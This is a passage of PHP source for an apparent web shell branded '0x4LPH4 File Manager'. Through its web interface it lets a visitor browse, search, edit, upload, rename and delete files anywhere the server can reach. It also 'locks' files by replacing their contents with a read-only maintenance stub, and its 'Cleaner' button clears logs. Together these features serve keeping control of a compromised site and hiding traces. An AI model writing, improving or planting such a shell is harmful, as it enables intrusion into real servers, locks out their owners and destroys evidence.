if (isset($_GET['lock'])) {
    $raw = $_GET['lock'];
    $abs = lock_target_path($raw);
    
    if (!file_exists($abs)) {
        $_SESSION['toast'] = "File not found!";
        header("Location: ?" . getRedirectParams());
        exit;
    }
    
    $bak = make_backup_name($abs);
    
    // Prevent double-lock
    if (is_locked_backup_present($abs)) {
        $_SESSION['toast'] = "Item already locked.";
        header("Location: ?" . getRedirectParams());
        exit;
    }
    
    // For files: backup original content and replace with maintenance message
    if (is_file($abs)) {
        // Read original content
        $originalContent = file_get_contents($abs);
        
        // Create backup with original content
        if (file_put_contents($bak, $originalContent) === false) {
            $_SESSION['toast'] = "Failed to create backup!";
            header("Location: ?" . getRedirectParams());
            exit;
        }
        
        // Replace file with maintenance message
        $stub = create_lock_stub_text($abs);
        if (file_put_contents($abs, $stub) === false) {
            $_SESSION['toast'] = "Failed to lock file!";
            // Clean up backup if stub creation failed
            if (file_exists($bak)) {
                unlink($bak);
            }
            header("Location: ?" . getRedirectParams());
            exit;
        }
        
        // Set read-only permissions
        @chmod($abs, 0444);
        
    } elseif (is_dir($abs)) {
        // For directories: create backup and maintenance file
        if (!@rename($abs, $bak)) {
            $_SESSION['toast'] = "Failed to lock directory!";
            header("Location: ?" . getRedirectParams());
            exit;
        }
        
        // Recreate directory with maintenance notice
        @mkdir($abs, 0755, true);
        $stub = create_lock_stub_text($abs);
        @file_put_contents($abs . DIRECTORY_SEPARATOR . 'README.MAINTENANCE', $stub);
    }
    
    // Set appropriate success message
    $_SESSION['toast'] = "Locked Successfully!✅";
    
    header("Location: ?" . getRedirectParams());
    exit;
}

/* UNLOCK - FIXED VERSION */
if (isset($_GET['unlock'])) {
    $raw = $_GET['unlock'];
    $abs = lock_target_path($raw);
    $bak = make_backup_name($abs);
    
    // Check if backup exists
    if (!file_exists($bak)) {
        $_SESSION['toast'] = "No backup found to unlock!";
        header("Location: ?" . getRedirectParams());
        exit;
    }
    
    // Remove the current locked file/directory
    if (file_exists($abs)) {
        if (is_dir($abs)) {
            // For directories: remove maintenance file and directory
            $stubfile = $abs . DIRECTORY_SEPARATOR . 'README.MAINTENANCE';
            if (file_exists($stubfile)) {
                @unlink($stubfile);
            }
            // Remove all files in directory first
            $files = array_diff(scandir($abs), array('.', '..'));
            foreach ($files as $file) {
                $filePath = $abs . DIRECTORY_SEPARATOR . $file;
                if (is_file($filePath)) {
                    @unlink($filePath);
                }
            }
            @rmdir($abs);
        } else {
            // For files: simply remove the locked file
            @unlink($abs);
        }
    }
    
    // Restore from backup
    if (is_dir($bak)) {
        // For directories: restore the entire directory
        if (!@rename($bak, $abs)) {
            $_SESSION['toast'] = "Failed to restore directory!";
            header("Location: ?" . getRedirectParams());
            exit;
        }
    } else {
        // For files: restore the original content
        $originalContent = file_get_contents($bak);
        if (file_put_contents($abs, $originalContent) === false) {
            $_SESSION['toast'] = "Failed to restore file content!";
            header("Location: ?" . getRedirectParams());
            exit;
        }
        
        // Remove backup file after successful restoration
        @unlink($bak);
        
        // Restore writable permissions
        @chmod($abs, 0644);
    }
    
    $_SESSION['toast'] = "Unlocked Successfully!✅";
    header("Location: ?" . getRedirectParams());
    exit;
}

/* EDITOR */
if (isset($_GET['edit'])) {
    $editFile = $_GET['edit'];

    if (is_locked_backup_present($editFile)) {
        echo "<div style='max-width:900px;margin:30px auto;padding:40px;border-radius:28px;background:#f0f0f3;color:#2d3436;box-shadow:20px 20px 40px #d1d9e6, -20px -20px 40px #ffffff;text-align:center;'>"
           . "<p style='color:#ff4757;font-weight:700;font-size:18px;'>File is LOCKED – cannot edit.</p></div>";
        exit;
    }

    if (!is_writable($editFile)) {
        echo "<div style='max-width:900px;margin:30px auto;padding:40px;border-radius:28px;background:#f0f0f3;color:#2d3436;box-shadow:20px 20px 40px #d1d9e6, -20px -20px 40px #ffffff;text-align:center;'>"
           . "<p style='color:#ff4757;font-weight:700;font-size:18px;'>File is read-only – cannot edit.</p></div>";
        exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($editFile, $_POST['content']);
        $_SESSION['toast'] = "Saved successfully!✅";
        header("Location: ?" . getRedirectParams());
        exit;
    }

    $data = htmlspecialchars(file_get_contents($editFile), ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Editing: <?php echo htmlspecialchars($editFile,ENT_QUOTES); ?></title>
<style>
/* NEUMORPHIC 3D WHITE UI */
:root {
  --white: #ffffff;
  --light-gray: #f0f0f3;
  --medium-gray: #d1d9e6;
  --shadow-light: 8px 8px 16px #d1d9e6,
                 -8px -8px 16px #ffffff;
  --shadow-inset: inset 4px 4px 8px #d1d9e6,
                 inset -4px -4px 8px #ffffff;
  --primary: #6c5ce7;
  --text-dark: #2d3436;
}

*{box-sizing:border-box}
html, body {
  height: 100%;
  margin: 0;
  font-family: 'Segoe UI', 'SF Mono', Monaco, 'Courier New', monospace;
  color: var(--text-dark);
  background: var(--light-gray);
}

.container {
  max-width: 1200px;
  margin: 40px auto;
  padding: 0 20px;
}

.card{
  border-radius: 28px;
  padding: 40px;
  background: var(--light-gray);
  box-shadow: 20px 20px 40px #d1d9e6,
             -20px -20px 40px #ffffff;
  position: relative;
  overflow: hidden;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary), #00d2d3);
  border-radius: 28px 28px 0 0;
}

h2{
  margin: 0 0 28px 0;
  color: var(--text-dark);
  font-size: 24px;
  font-weight: 700;
}

textarea{
  width: 100%;
  height: 600px;
  border-radius: 20px;
  padding: 24px;
  border: none;
  font-family: 'SF Mono', Monaco, 'Courier New', monospace;
  resize: vertical;
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-inset);
  outline: none;
  font-size: 14px;
  line-height: 1.6;
  transition: all 0.3s ease;
}

textarea:focus{
  box-shadow: inset 6px 6px 12px #d1d9e6,
              inset -6px -6px 12px #ffffff;
}

.btn-group {
  display: flex;
  gap: 16px;
  margin-top: 28px;
}

.btn{
  flex: 1;
  padding: 16px 24px;
  border-radius: 20px;
  border: none;
  font-weight: 700;
  text-decoration: none;
  font-family: inherit;
  cursor: pointer;
  transition: all 0.3s ease;
  font-size: 15px;
  text-align: center;
}

.btn-primary{
  background: var(--light-gray);
  color: var(--primary);
  box-shadow: var(--shadow-light);
}

.btn-primary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}

.btn-secondary{
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-light);
}

.btn-secondary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h2>Editing: <?php echo htmlspecialchars($editFile,ENT_QUOTES); ?></h2>
    <form method="post">
      <textarea name="content" spellcheck="false"><?php echo $data; ?></textarea>
      <div class="btn-group">
        <button class="btn btn-primary" type="submit">Save</button>
        <a href="?<?php echo getRedirectParams(); ?>" class="btn btn-secondary">Back</a>
      </div>
    </form>
  </div>
</div>
</body>
</html>
<?php exit; }

/* UPLOAD - FIXED VERSION */
if (isset($_FILES['upload']) && isset($_FILES['upload']['tmp_name']) && is_uploaded_file($_FILES['upload']['tmp_name'])) {
    $destName = basename($_FILES['upload']['name']);
    $uploadPath = $fullPath . '/' . $destName;
    
    // Check if destination is writable
    if (!is_writable($fullPath)) {
        $_SESSION['toast'] = "Upload failed: Directory is not writable!";
        header("Location: ?" . getRedirectParams());
        exit;
    }
    
    // Move uploaded file
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath)) {
        $_SESSION['toast'] = "File Uploaded!✅";
    } else {
        $_SESSION['toast'] = "Upload failed! Please check permissions.";
    }
    header("Location: ?" . getRedirectParams());
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>0x4LPH4 - File Manager</title>
<style>
/* NEUMORPHIC 3D WHITE UI - OPTIMIZED */
:root {
  --white: #ffffff;
  --light-gray: #f0f0f3;
  --medium-gray: #d1d9e6;
  --dark-gray: #a3a3a3;
  --shadow-light: 8px 8px 16px #d1d9e6,
                 -8px -8px 16px #ffffff;
  --shadow-inset: inset 4px 4px 8px #d1d9e6,
                 inset -4px -4px 8px #ffffff;
  --shadow-pressed: 4px 4px 8px #d1d9e6,
                   -4px -4px 8px #ffffff;
  --shadow-deep: 20px 20px 40px #c8d0e7,
                -20px -20px 40px #ffffff;
  --primary: #6c5ce7;
  --primary-dark: #5b4bd8;
  --primary-light: #7d6de8;
  --error: #ff4757;
  --success: #00d2d3;
  --text-dark: #2d3436;
  --text-light: #636e72;
  --border: rgba(209, 217, 230, 0.5);
  --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

html, body {
  height: 100%;
  font-family: 'Segoe UI', 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
  color: var(--text-dark);
  background: var(--light-gray);
  overflow-x: hidden;
}

/* Main container */
.container {
  max-width: 1400px;
  margin: 0 auto;
  padding: 24px;
  position: relative;
}

/* Header card with neumorphic design */
.header-card {
  border-radius: 28px;
  padding: 32px;
  background: var(--light-gray);
  box-shadow: var(--shadow-deep);
  margin-bottom: 24px;
  position: relative;
  overflow: hidden;
}

.header-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary), var(--success));
  border-radius: 28px 28px 0 0;
}

/* Brand section */
.brand-section {
  display: flex;
  align-items: center;
  gap: 20px;
  margin-bottom: 28px;
}

.brand-logo {
  width: 64px;
  height: 64px;
  border-radius: 20px;
  background: var(--light-gray);
  box-shadow: var(--shadow-light),
              inset 2px 2px 4px rgba(255, 255, 255, 0.8),
              inset -2px -2px 4px rgba(209, 217, 230, 0.6);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  padding: 8px;
  flex-shrink: 0;
}

.brand-logo img {
  width: 100%;
  height: 100%;
  object-fit: contain;
  border-radius: 12px;
}

.brand-text h1 {
  font-size: 28px;
  font-weight: 800;
  color: var(--text-dark);
  letter-spacing: -0.5px;
  margin-bottom: 4px;
}

.brand-text .subtitle {
  font-size: 14px;
  color: var(--text-light);
  font-weight: 500;
}

/* Controls grid */
.controls-grid {
  display: grid;
  grid-template-columns: 1fr auto;
  gap: 24px;
  align-items: center;
  margin-bottom: 24px;
}

/* Search box */
.search-box {
  position: relative;
}

.search-input {
  width: 100%;
  padding: 16px 24px;
  padding-left: 52px;
  border-radius: 20px;
  border: none;
  background: var(--light-gray);
  box-shadow: var(--shadow-inset);
  font-size: 15px;
  font-weight: 500;
  color: var(--text-dark);
  transition: var(--transition);
}

.search-input:focus {
  outline: none;
  box-shadow: inset 6px 6px 12px #d1d9e6,
              inset -6px -6px 12px #ffffff;
}

.search-input::placeholder {
  color: var(--dark-gray);
}

.search-icon {
  position: absolute;
  left: 20px;
  top: 50%;
  transform: translateY(-50%);
  color: var(--text-light);
}

/* Path display */
.path-display {
  background: var(--light-gray);
  padding: 16px 24px;
  border-radius: 20px;
  box-shadow: var(--shadow-inset);
  font-family: 'SF Mono', Monaco, 'Courier New', monospace;
  font-size: 14px;
  color: var(--text-dark);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 500px;
}

/* Action buttons */
.action-buttons {
  display: flex;
  gap: 12px;
  flex-wrap: wrap;
}

.btn {
  padding: 14px 24px;
  border-radius: 20px;
  border: none;
  font-weight: 700;
  font-size: 14px;
  font-family: inherit;
  cursor: pointer;
  transition: var(--transition);
  display: inline-flex;
  align-items: center;
  gap: 10px;
  text-decoration: none;
  position: relative;
  overflow: hidden;
}

.btn-primary {
  background: var(--light-gray);
  color: var(--primary);
  box-shadow: var(--shadow-light);
}

.btn-primary:hover {
  background: var(--light-gray);
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
}

.btn-primary:active {
  transform: translateY(0);
  box-shadow: inset 4px 4px 8px #d1d9e6,
              inset -4px -4px 8px #ffffff;
}

.btn-secondary {
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-light);
}

.btn-secondary:hover {
  background: var(--light-gray);
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
}

.btn-secondary:active {
  transform: translateY(0);
  box-shadow: inset 4px 4px 8px #d1d9e6,
              inset -4px -4px 8px #ffffff;
}

/* File list card */
.file-list-card {
  border-radius: 28px;
  padding: 32px;
  background: var(--light-gray);
  box-shadow: var(--shadow-deep);
  margin-bottom: 24px;
  position: relative;
  overflow: hidden;
}

.file-list-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, #00d2d3, var(--primary));
  border-radius: 28px 28px 0 0;
}

/* Breadcrumb */
.breadcrumb {
  display: flex;
  gap: 12px;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 28px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--border);
}

.breadcrumb a {
  color: var(--primary);
  text-decoration: none;
  font-weight: 600;
  font-size: 14px;
  padding: 10px 16px;
  border-radius: 16px;
  background: var(--light-gray);
  box-shadow: var(--shadow-light);
  transition: var(--transition);
}

.breadcrumb a:hover {
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
}

/* Search info */
.search-info {
  background: var(--light-gray);
  padding: 20px 24px;
  border-radius: 20px;
  margin-bottom: 28px;
  box-shadow: var(--shadow-inset);
}

.search-info h3 {
  font-size: 18px;
  font-weight: 700;
  color: var(--text-dark);
  margin-bottom: 8px;
}

.search-info .clear-search {
  color: var(--primary);
  text-decoration: none;
  font-weight: 600;
  font-size: 14px;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

/* File list */
.file-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

.file-item {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 20px 24px;
  margin-bottom: 12px;
  border-radius: 20px;
  background: var(--light-gray);
  box-shadow: var(--shadow-light);
  transition: var(--transition);
  position: relative;
  overflow: hidden;
}

.file-item:hover {
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
}

.file-item::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 4px;
  height: 100%;
  background: var(--primary);
  border-radius: 20px 0 0 20px;
  opacity: 0;
  transition: var(--transition);
}

.file-item:hover::before {
  opacity: 1;
}

.file-info {
  display: flex;
  align-items: center;
  gap: 20px;
  flex: 1;
  min-width: 0;
}

.file-icon {
  width: 56px;
  height: 56px;
  border-radius: 16px;
  background: var(--light-gray);
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 700;
  color: var(--primary);
  flex-shrink: 0;
  box-shadow: var(--shadow-inset);
  font-size: 12px;
  text-transform: uppercase;
}

.file-details {
  flex: 1;
  min-width: 0;
}

.file-name {
  font-weight: 700;
  color: var(--text-dark);
  font-size: 16px;
  margin-bottom: 6px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.file-name a {
  color: inherit;
  text-decoration: none;
}

.file-meta {
  font-size: 13px;
  color: var(--text-light);
  font-weight: 500;
}

/* File actions */
.file-actions {
  display: flex;
  gap: 10px;
  flex-shrink: 0;
}

.file-action-btn {
  padding: 10px 16px;
  border-radius: 16px;
  border: none;
  font-weight: 600;
  font-size: 13px;
  font-family: inherit;
  cursor: pointer;
  transition: var(--transition);
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-light);
  text-decoration: none;
  display: inline-block;
}

.file-action-btn:hover {
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
}

.file-action-btn:active {
  transform: translateY(0);
  box-shadow: inset 4px 4px 8px #d1d9e6,
              inset -4px -4px 8px #ffffff;
}

.file-action-btn.disabled {
  opacity: 0.5;
  pointer-events: none;
}

/* Footer */
.footer {
  text-align: center;
  padding: 24px;
  color: var(--text-light);
  font-size: 14px;
  font-weight: 500;
}

/* Toast notification */
.toast {
  position: fixed;
  top: 24px;
  right: 24px;
  padding: 16px 24px;
  border-radius: 20px;
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-deep);
  font-weight: 600;
  z-index: 1000;
  animation: slideIn 0.3s ease;
  display: flex;
  align-items: center;
  gap: 12px;
  max-width: 400px;
}

@keyframes slideIn {
  from {
    transform: translateX(100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

.toast.success {
  border-left: 4px solid var(--success);
}

.toast.error {
  border-left: 4px solid var(--error);
}

/* Upload form */
.upload-form {
  display: inline-block;
  margin: 0;
}

.upload-label {
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 8px;
}

.upload-input {
  display: none;
}

/* Responsive design */
@media (max-width: 1200px) {
  .controls-grid {
    grid-template-columns: 1fr;
    gap: 20px;
  }
  
  .path-display {
    max-width: 100%;
  }
}

@media (max-width: 768px) {
  .container {
    padding: 16px;
  }
  
  .header-card,
  .file-list-card {
    padding: 24px;
    border-radius: 24px;
  }
  
  .brand-section {
    flex-direction: column;
    text-align: center;
    gap: 16px;
  }
  
  .file-item {
    flex-direction: column;
    align-items: stretch;
    gap: 20px;
  }
  
  .file-actions {
    width: 100%;
    justify-content: flex-start;
    flex-wrap: wrap;
  }
  
  .action-buttons {
    justify-content: center;
  }
  
  .btn {
    padding: 12px 20px;
    font-size: 13px;
  }
}

@media (max-width: 480px) {
  .header-card,
  .file-list-card {
    padding: 20px;
    border-radius: 20px;
  }
  
  .file-icon {
    width: 48px;
    height: 48px;
  }
  
  .file-name {
    font-size: 14px;
  }
  
  .file-action-btn {
    padding: 8px 12px;
    font-size: 12px;
  }
  
  .search-input {
    padding: 14px 20px;
    padding-left: 48px;
    font-size: 14px;
  }
}

/* Performance optimizations */
* {
  backface-visibility: hidden;
  -webkit-tap-highlight-color: transparent;
}

/* Reduce motion for accessibility */
@media (prefers-reduced-motion: reduce) {
  * {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}
</style>
</head>
<body>
<div class="container">
  <!-- Toast Notification -->
  <?php if (!empty($_SESSION['toast'])): ?>
  <div class="toast success" id="toast">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <polyline points="20 6 9 17 4 12"></polyline>
    </svg>
    <?php echo htmlspecialchars($_SESSION['toast'], ENT_QUOTES); ?>
  </div>
  <?php unset($_SESSION['toast']); endif; ?>

  <!-- Header Card -->
  <div class="header-card">
    <div class="brand-section">
      <div class="brand-logo">
        <img src="https://i.ibb.co/DDmnztxr/20251208-093450.png" alt="0x4LPH4 Logo">
      </div>
      <div class="brand-text">
        <h1>0x4LPH4 File Manager</h1>
        <div class="subtitle">Secure File Management System</div>
      </div>
    </div>

    <div class="controls-grid">
      <!-- Search Box -->
      <div class="search-box">
        <svg class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <circle cx="11" cy="11" r="8"></circle>
          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
        </svg>
        <form method="get" id="searchForm">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($path, ENT_QUOTES); ?>">
          <input type="hidden" name="scroll" value="<?php echo isset($_GET['scroll']) ? intval($_GET['scroll']) : 0; ?>">
          <input type="text" 
                 name="search" 
                 class="search-input" 
                 placeholder="Search files and folders..."
                 value="<?php echo htmlspecialchars($searchTerm, ENT_QUOTES); ?>"
                 oninput="handleSearchInput(this.value)">
        </form>
      </div>

      <!-- Path Display -->
      <div class="path-display" id="currentPathDisplay">
        <?php echo htmlspecialchars($fullPath, ENT_QUOTES); ?>
      </div>
    </div>

    <!-- Action Buttons -->
    <div class="action-buttons">
      <button class="btn btn-primary" onclick="copyPath()" title="Copy current path">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
        </svg>
        Copy Path
      </button>

      <!-- Upload Form -->
      <form method="post" enctype="multipart/form-data" class="upload-form">
        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path, ENT_QUOTES); ?>">
        <input type="hidden" name="scroll" value="<?php echo isset($_GET['scroll']) ? intval($_GET['scroll']) : 0; ?>">
        <label class="btn btn-secondary upload-label">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
            <polyline points="17 8 12 3 7 8"></polyline>
            <line x1="12" y1="3" x2="12" y2="15"></line>
          </svg>
          Upload
          <input type="file" name="upload" class="upload-input" onchange="handleFileUpload(this)">
        </label>
      </form>

      <a href="?create=file&<?php echo getRedirectParams(); ?>" class="btn btn-primary" onclick="saveScrollPosition()">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="12" y1="18" x2="12" y2="12"></line>
          <line x1="9" y1="15" x2="15" y2="15"></line>
        </svg>
        New File
      </a>

      <a href="?create=folder&<?php echo getRedirectParams(); ?>" class="btn btn-primary" onclick="saveScrollPosition()">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path>
          <line x1="12" y1="11" x2="12" y2="17"></line>
          <line x1="9" y1="14" x2="15" y2="14"></line>
        </svg>
        New Folder
      </a>

      <a href="?clearlogs=1&<?php echo getRedirectParams(); ?>" class="btn btn-secondary" onclick="saveScrollPosition(); return confirm('Clear all logs? This cannot be undone.')">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <polyline points="3 6 5 6 21 6"></polyline>
          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
        </svg>
        Cleaner
      </a>

      <a href="?logout=1" class="btn btn-secondary">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
          <polyline points="16 17 21 12 16 7"></polyline>
          <line x1="21" y1="12" x2="9" y2="12"></line>
        </svg>
        Logout
      </a>
    </div>
  </div>

  <!-- File List Card -->
  <div class="file-list-card">
    <!-- Breadcrumb -->
    <div class="breadcrumb">
      <?php echo $breadcrumb; ?>
    </div>

    <!-- Search Results -->
    <?php if ($searchTerm !== ''): ?>
    <div class="search-info">
      <h3>Search Results for "<?php echo htmlspecialchars($searchTerm, ENT_QUOTES); ?>"</h3>
      <div>Found <?php echo count($searchResults); ?> result(s)</div>
      <a href="?<?php echo getRedirectParams(); ?>" class="clear-search">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <line x1="18" y1="6" x2="6" y2="18"></line>
          <line x1="6" y1="6" x2="18" y2="18"></line>
        </svg>
        Clear Search
      </a>
    </div>
    <?php endif; ?>

    <!-- File List -->
    <ul class="file-list">
      <?php
      $displayItems = $searchTerm !== '' ? $searchResults : scandir($fullPath);
      
      foreach ($displayItems as $entry) {
          if ($searchTerm !== '') {
              // For search results, $entry is already the full path
              $filePath = $entry;
              $entry = basename($entry);
          } else {
              // For normal directory listing
              if ($entry === '.' || $entry === '..') continue;
              $filePath = $fullPath . DIRECTORY_SEPARATOR . $entry;
          }
          
          $urlPath = rawurlencode($filePath);
          $isWritable = is_writable($filePath);
          $isDir = is_dir($filePath);
          $meta = $isDir ? "Directory" : (round(filesize($filePath)/1024,2) . " KB");
          $iconLabel = $isDir ? "DIR" : strtoupper(pathinfo($entry, PATHINFO_EXTENSION) ?: 'FILE');
          $isLocked = is_locked_backup_present($filePath);
          $jsSafePath = addslashes($filePath);
          
          echo "<li class='file-item'>";
          echo "<div class='file-info'>";
          echo "<div class='file-icon'>" . htmlspecialchars($iconLabel, ENT_QUOTES) . "</div>";
          echo "<div class='file-details'>";
          
          if ($isDir) {
              echo "<div class='file-name'><a href='?" . getRedirectParamsForLink($filePath) . "' onclick=\"setPath('" . htmlspecialchars($jsSafePath, ENT_QUOTES) . "')\">" . htmlspecialchars($entry, ENT_QUOTES) . "</a></div>";
          } else {
              echo "<div class='file-name' onclick=\"setPath('" . htmlspecialchars($jsSafePath, ENT_QUOTES) . "')\" style='cursor:pointer;'>" . htmlspecialchars($entry, ENT_QUOTES) . "</div>";
          }
          
          echo "<div class='file-meta'>" . htmlspecialchars($meta, ENT_QUOTES) . "</div>";
          echo "</div>";
          echo "</div>";
          
          echo "<div class='file-actions'>";
          if (!$isDir) {
              $editClass = ($isWritable && !$isLocked) ? "file-action-btn" : "file-action-btn disabled";
              echo "<a class='$editClass' href='?edit=$urlPath&" . getRedirectParams() . "' onclick=\"saveScrollPosition();\">Edit</a>";
          }
          echo "<a class='file-action-btn' href='?rename=$urlPath&" . getRedirectParams() . "' onclick=\"saveScrollPosition();\">Rename</a>";
          echo "<a class='file-action-btn' href='?delete=$urlPath&" . getRedirectParams() . "' onclick=\"saveScrollPosition(); return confirm('Delete " . addslashes($entry) . "?')\">Delete</a>";
          
          if (!$isLocked) {
              echo "<a class='file-action-btn' href='?lock=$urlPath&" . getRedirectParams() . "' onclick=\"saveScrollPosition();\">Lock</a>";
          } else {
              echo "<a class='file-action-btn' href='?unlock=$urlPath&" . getRedirectParams() . "' onclick=\"saveScrollPosition();\">Unlock</a>";
          }
          echo "</div>";
          echo "</li>";
      }
      ?>
    </ul>
  </div>

  <!-- Footer -->
  <div class="footer">
    © 2025 0x4LPH4 Security - All Rights Reserved
  </div>
</div>

<script>
// Performance-optimized JavaScript
let searchTimeout = null;
let lastClickedPath = <?php echo json_encode($fullPath, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_AMP|JSON_HEX_QUOT); ?>;
let currentScrollPos = <?php echo isset($_GET['scroll']) ? intval($_GET['scroll']) : 0; ?>;

// Set path function
function setPath(path) {
    lastClickedPath = path;
    const display = document.getElementById('currentPathDisplay');
    if (display) {
        display.textContent = path;
    }
}

// Copy path to clipboard
function copyPath() {
    const text = lastClickedPath || document.getElementById('currentPathDisplay')?.textContent || '';
    if (!text) return;
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast('Path copied to clipboard');
        }).catch(() => fallbackCopy(text));
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    showToast('Path copied to clipboard');
}

// Search input handler with debouncing
function handleSearchInput(value) {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {
        if (value.length >= 2 || value.length === 0) {
            saveScrollPosition();
            document.getElementById('searchForm').submit();
        }
    }, 500);
}

// File upload handler
function handleFileUpload(input) {
    if (input.files && input.files[0]) {
        showToast('Uploading file...');
        const form = input.closest('form');
        if (form) {
            saveScrollPosition();
            form.submit();
        }
    }
}

// Toast notification
function showToast(message, type = 'success') {
    // Remove existing toast
    const existing = document.querySelector('.toast');
    if (existing) {
        existing.remove();
    }
    
    // Create new toast
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
        ${message}
    `;
    document.body.appendChild(toast);
    
    // Auto-remove after 3 seconds
    setTimeout(() => {
        if (toast.parentNode) {
            toast.remove();
        }
    }, 3000);
}

// Save scroll position
function saveScrollPosition() {
    const scrollPos = window.pageYOffset || document.documentElement.scrollTop;
    
    // Update all links
    document.querySelectorAll('a[href*="?"]').forEach(link => {
        const href = link.getAttribute('href');
        if (href && href.includes('?')) {
            let newHref = href.replace(/&scroll=\d+/, '');
            newHref += (newHref.includes('?') ? '&' : '?') + 'scroll=' + scrollPos;
            link.setAttribute('href', newHref);
        }
    });
    
    // Update forms
    document.querySelectorAll('form').forEach(form => {
        let scrollInput = form.querySelector('input[name="scroll"]');
        if (!scrollInput) {
            scrollInput = document.createElement('input');
            scrollInput.type = 'hidden';
            scrollInput.name = 'scroll';
            form.appendChild(scrollInput);
        }
        scrollInput.value = scrollPos;
    });
}

// Restore scroll position
function restoreScrollPosition() {
    if (currentScrollPos > 0) {
        requestAnimationFrame(() => {
            window.scrollTo(0, currentScrollPos);
        });
    }
}

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => {
    // Auto-remove toast after 3 seconds
    const toast = document.querySelector('.toast');
    if (toast) {
        setTimeout(() => {
            toast.remove();
        }, 3000);
    }
    
    // Add path data to breadcrumb links
